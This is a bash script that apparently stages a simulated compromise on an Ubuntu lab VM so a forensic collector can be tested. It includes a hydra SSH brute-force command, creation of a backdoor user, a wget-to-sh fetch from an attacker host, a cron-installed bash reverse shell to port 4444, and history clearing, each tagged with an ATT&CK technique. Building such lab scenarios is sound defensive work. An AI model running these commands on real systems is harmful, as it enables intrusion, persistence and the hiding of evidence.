#!/usr/bin/env bash
# Victim-LNX scenario (PRD open question 3): run on the Ubuntu lab VM AFTER the SSH brute force from Kali:
#   hydra -l labadmin -P words.txt -t 4 ssh://<victim-lnx>
# Then, logged in as labadmin over SSH:
set -euo pipefail
ATTACKER="${1:-192.168.56.20}"
sudo useradd -m sysupdate                                            # T1136.001
wget -qO- "http://$ATTACKER:8000/x.sh" | sh || true                   # T1059.004 (serve a harmless x.sh)
(crontab -l 2>/dev/null; echo "*/5 * * * * bash -c 'bash -i >& /dev/tcp/$ATTACKER/4444 0>&1'") | crontab -   # T1053.003
history -c                                                            # T1070.003
echo "done - now run: sudo ./forensight collect --profile full --out /media/usb/evidence"
